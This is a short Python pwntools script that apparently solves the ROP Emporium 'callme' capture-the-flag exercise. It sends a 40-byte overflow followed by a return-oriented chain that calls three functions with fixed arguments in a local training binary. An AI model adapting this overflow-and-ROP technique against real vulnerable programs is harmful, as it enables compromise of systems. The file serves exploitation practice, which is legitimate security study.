import os
from pwn import *

e = ELF('./callme')
gg = 0x0000000000401ab0 # pop rdi ; pop rsi ; pop rdx ; ret

payload = 'A'*40        # offset
payload += p64(gg)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(e.symbols['callme_one'])
payload += p64(gg)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(e.symbols['callme_two'])
payload += p64(gg)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(e.symbols['callme_three'])

#print (payload)

r = process(e.path)
r.recvuntil('>')
r.sendline(payload)
r.interactive()
